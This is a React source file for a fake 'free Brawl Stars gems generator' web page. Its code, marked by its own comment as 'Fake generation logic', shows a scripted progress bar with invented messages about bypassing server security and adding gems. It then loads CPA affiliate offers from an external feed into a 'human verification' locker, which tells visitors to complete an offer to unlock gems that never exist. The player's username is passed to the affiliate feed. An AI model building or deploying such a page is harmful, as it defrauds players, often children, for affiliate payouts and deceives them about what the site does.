import { useState } from 'react';
import { Zap, Server, User } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import fetchJsonp from 'fetch-jsonp';

// Use the exact official local URLs downloaded to the public folder
const GEM_ICON = "/gem.png";
const LOGO_URL = "/logo.svg";


const GEMS_OPTIONS = [80, 170, 360, 2000];

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [username, setUsername] = useState('');
  const [selectedGems, setSelectedGems] = useState<number | null>(null);


  // Generation Modal State
  const [isGenerating, setIsGenerating] = useState(false);
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState('');
  const [isFinished, setIsFinished] = useState(false);
  const [deviceFilter, setDeviceFilter] = useState('iOS');

  // CPA Offers State
  const [offers, setOffers] = useState<any[]>([]);
  const [isFetchingOffers, setIsFetchingOffers] = useState(false);

  // Fake generation logic
  const handleGenerate = () => {
    if (!username || !selectedGems) return;

    setIsGenerating(true);
    setProgress(0);
    setIsFinished(false);

    const steps = [
      { p: 10, text: "Connecting to Brawl Stars servers..." },
      { p: 25, text: "Searching for player tag: " + username },
      { p: 40, text: "Player verified! Securing connection..." },
      { p: 60, text: `Preparing to inject ${selectedGems} Gems...` },
      { p: 80, text: "Bypassing server security protocols..." },
      { p: 95, text: "Finalizing transaction..." },
      { p: 100, text: "Gems successfully added!" }
    ];

    let currentStep = 0;

    const nextStep = () => {
      if (currentStep < steps.length) {
        setProgress(steps[currentStep].p);
        setStatusText(steps[currentStep].text);

        let delay = Math.random() * 1000 + 800; // Random delay between 800ms and 1800ms
        if (currentStep === steps.length - 1) delay = 1000;

        setTimeout(() => {
          currentStep++;
          nextStep();
        }, delay);
      } else {
        setIsFetchingOffers(true);
        setStatusText("Loading Human Verification...");

        // Fetch CPA Offers using native JSONP and environment variables to bypass strict CORS policies completely
        const baseUrl = import.meta.env.VITE_CPA_FEED_URL || 'https://d2dzcaq3bhqk1m.cloudfront.net/public/offers/feed.php';
        const userId = import.meta.env.VITE_CPA_USER_ID;
        const apiKey = import.meta.env.VITE_CPA_API_KEY;

        const feedUrl = `${baseUrl}?user_id=${userId}&api_key=${apiKey}&s1=${username}&s2=${selectedGems}`;

        fetchJsonp(feedUrl)
          .then(res => res.json())
          .then(data => {
            // The JSONP feed returns the array of offers directly as the root object
            if (Array.isArray(data)) {
              setOffers(data.slice(0, 4)); // Get top 4 converting offers
            } else if (data && data.offers) {
              setOffers(data.offers.slice(0, 4));
            }
          })
          .catch(err => console.error("Locker Error:", err))
          .finally(() => {
            setTimeout(() => {
              setIsFetchingOffers(false);
              setIsFinished(true); // Triggers Locker UI
            }, 800);
          });
      }
    };

    nextStep();
  };


  return (
    <div className="app-container">
      {/* Centered Content Wrapper */}
      <div className="content-wrapper">

        {/* Header */}
        <motion.div
          initial={{ y: -50, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className="header"
        >
          <div style={{ textAlign: 'center' }}>
            <img
              src={LOGO_URL}
              alt="Brawl Stars Logo"
              style={{
                height: '140px',
                objectFit: 'contain',
                filter: 'drop-shadow(0 8px 16px rgba(0,0,0,0.6))',
                marginBottom: '10px'
              }}
              onError={(e) => {
                // Fallback if image fails to load
                (e.target as HTMLImageElement).style.display = 'none';
                document.getElementById('fallback-text-logo')!.style.display = 'block';
              }}
            />
            <h1 id="fallback-text-logo" className="logo-text text-stroke" style={{ display: 'none' }}>
              BRAWL <span style={{ color: 'white' }}>STARS</span>
            </h1>
          </div>
        </motion.div>

        {/* Main Panel */}
        <motion.div
          className="panel"
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.2 }}
        >
          {/* --- STEP 1: Gems Selection --- */}
          {currentStep === 1 && (
            <motion.div
              initial={{ x: -20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: 20, opacity: 0 }}
            >
              <label className="input-label" style={{ marginBottom: '1.5rem' }}>
                <Zap size={20} style={{ display: 'inline', marginRight: '8px', verticalAlign: 'middle', color: 'var(--bs-yellow-btn)' }} />
                Select Amount of Gems
              </label>

              <div className="gem-grid">
                {GEMS_OPTIONS.map((amount) => (
                  <div
                    key={amount}
                    className={`gem-card ${selectedGems === amount ? 'active' : ''}`}
                    onClick={() => setSelectedGems(amount)}
                  >
                    <img
                      src={GEM_ICON}
                      alt="Gem"
                      className="gem-icon animate-pulse"
                    />
                    <div className="gem-amount text-stroke">{amount}</div>
                  </div>
                ))}
              </div>

              <button
                className="btn-primary"
                onClick={() => setCurrentStep(2)}
                disabled={!selectedGems}
                style={{ marginTop: '1rem' }}
              >
                NEXT
              </button>
            </motion.div>
          )}

          {/* --- STEP 2: Username & Device Input --- */}
          {currentStep === 2 && (
            <motion.div
              initial={{ x: 20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: -20, opacity: 0 }}
            >
              <div className="input-group">
                <label className="input-label">
                  <User size={20} style={{ display: 'inline', marginRight: '8px', verticalAlign: 'middle', color: 'var(--bs-yellow-btn)' }} />
                  Enter Your Player Tag or Username
                </label>
                <input
                  type="text"
                  className="input-field"
                  placeholder="e.g. #Y0URT4G"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>

              <div className="input-group">
                <label className="input-label">Select Device Platform</label>
                <div className="device-selector">
                  {['iOS', 'Android', 'PC'].map(device => (
                    <button
                      key={device}
                      className={`device-btn ${deviceFilter === device ? 'active' : ''}`}
                      onClick={() => setDeviceFilter(device)}
                      style={{
                        background: deviceFilter === device ? 'var(--bs-blue-light)' : 'rgba(0,0,0,0.3)',
                        borderColor: 'var(--bs-black)',
                        color: deviceFilter === device ? 'white' : '#ccc'
                      }}
                    >
                      {device}
                    </button>
                  ))}
                </div>
              </div>

              <div style={{ display: 'flex', gap: '10px', marginTop: '1rem' }}>
                <button
                  className="btn-primary"
                  onClick={() => setCurrentStep(1)}
                  style={{ background: '#555', flex: '0.4' }}
                >
                  BACK
                </button>
                <button
                  className="btn-primary"
                  onClick={handleGenerate}
                  disabled={!username || isGenerating}
                  style={{ flex: '1' }}
                >
                  {isGenerating ? 'GENERATING...' : 'CLAIM REWARD'}
                </button>
              </div>
            </motion.div>
          )}



        </motion.div>

        {/* Generation Modal */}
        <AnimatePresence>
          {isGenerating && (
            <motion.div
              className={`modal-overlay ${isFinished ? 'locker-overlay' : ''}`}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
            >
              <motion.div
                className={`modal-content ${isFinished ? 'locker-mode' : ''}`}
                initial={{ scale: 0.8, y: 20 }}
                animate={{ scale: 1, y: 0 }}
              >
                {!isFinished ? (
                  <>
                    <Server size={64} color="var(--bs-yellow-btn)" style={{ margin: '0 auto 1.5rem', filter: 'drop-shadow(0 4px 6px rgba(0,0,0,0.5))' }} className="animate-pulse" />
                    <h3 className="text-stroke" style={{ fontSize: '2.5rem', color: 'white', margin: 0 }}>PROCESSING</h3>

                    <div className="progress-bar-container">
                      <div className="progress-bar-fill" style={{ width: `${progress}%` }}></div>
                    </div>

                    <div className="status-text">{statusText}</div>
                    <div className="progress-percentage text-stroke">
                      {isFetchingOffers ? '99%' : `${progress}%`}
                    </div>

                    <div style={{ marginTop: '2rem', fontSize: '1rem', color: 'rgba(255,255,255,0.7)', fontWeight: '600' }}>
                      Please do not close this window while generating.
                    </div>
                  </>
                ) : (
                  <motion.div
                    initial={{ scale: 0.8, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    className="locker-container"
                  >
                    <img src={GEM_ICON} alt="Gems" style={{ width: '80px', height: '80px', margin: '0 auto 10px', filter: 'drop-shadow(0 4px 0 rgba(0,0,0,0.8))' }} className="animate-pulse" />
                    <h3 className="locker-title" style={{ fontSize: '2.4rem', color: 'var(--bs-white)', margin: '0 0 0.5rem', lineHeight: '1.2' }}>
                      VERIFICATION
                    </h3>
                    <p className="locker-desc" style={{ color: '#ccc', marginBottom: '1.5rem', fontSize: '1.1rem', lineHeight: '1.4' }}>
                      Complete <strong style={{ color: 'var(--bs-yellow-btn)' }}>ONE</strong> of the free tasks below to unlock your <strong style={{ color: '#54ff3b' }}>{selectedGems} Gems</strong>!
                    </p>

                    <div className="offer-list">
                      {offers.map((offer: any) => (
                        <a key={offer.id} href={offer.url} target="_blank" rel="noopener noreferrer" className="offer-card">
                          <img src={offer.network_icon} alt="Offer Icon" className="offer-icon" />
                          <div className="offer-details">
                            <h4 className="offer-title">{offer.anchor}</h4>
                            <p className="offer-desc">{offer.conversion}</p>
                          </div>
                          <div className="offer-btn-wrapper">
                            <button className="free-btn">FREE</button>
                          </div>
                        </a>
                      ))}

                      {offers.length === 0 && (
                        <div style={{ color: 'white', padding: '2rem', background: 'rgba(0,0,0,0.5)', borderRadius: '12px', border: '2px solid #555' }}>
                          Loading verification offers specifically for your device... Please wait.
                        </div>
                      )}
                    </div>

                    <div style={{
                      marginTop: '1.5rem',
                      fontSize: '0.9rem',
                      color: 'rgba(255,255,255,0.6)',
                      fontWeight: '500'
                    }}>
                      Verification usually takes less than 2 minutes. Gems will be sent to <strong style={{ color: 'white' }}>{username}</strong> immediately after completion.
                    </div>
                  </motion.div>
                )}
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
        {/* Background Character Art Full Bleed */}
        <div className="character-bg-footer">
          <picture>
            <img src="/bg_new.png" alt="Brawl Stars New Background" className="full-bg-img" />
          </picture>
        </div>

      </div> {/* End content-wrapper */}
    </div>
  );
}

export default App;
